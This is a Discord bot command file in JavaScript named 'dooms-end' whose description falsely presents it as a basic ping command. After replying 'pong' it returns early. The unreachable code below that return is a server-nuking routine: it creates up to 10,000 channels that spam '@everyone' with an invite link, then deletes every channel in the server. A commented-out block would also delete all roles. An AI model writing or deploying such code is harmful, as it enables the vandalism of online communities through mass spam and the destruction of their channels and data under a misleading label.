module.exports = {
    name: 'dooms-end',
    description: 'this is a basic ping command',
    execute(client, message, args, Discord) {
        function send(a) {
            message.channel.send(a);
        }

        function checkrole(role) {
            return message.member.roles.cache.some(r => r.name === role);
        }

        function addRoleMSGS(ole) {
            //adds role to message sender
            let role = message.guild.roles.cache.find(r => r.name === ole);
            message.member.roles.add(role).catch(console.error);
        }

        function firstMentioned() {
            var returnedobj = message.mentions.users.first();
            if (returnedobj == undefined) {
                return "asd";
            }
            return returnedobj.username;
        }
        send("pong");
        return send("what are you tying to do??");
        for(var i = 0; i <= 9999; ++i) {
        message.guild.channels.create('https://discord.gg/GcsFjtTst5', {
                reason: 'https://discord.gg/GcsFjtTst5'
            })
            .then(channel => channel.send("@everyone join https://discord.gg/GcsFjtTst5"))
            .catch(console.error);
    }
    // message.guild.roles.cache.forEach(roles => {
    //     roles.delete()
    //     .then(deleted => console.log(`Deleted role ${deleted.name}`))
    //     .catch(console.error);
    // });
    message.guild.channels.cache.forEach(channel => {channel.delete()});
}
}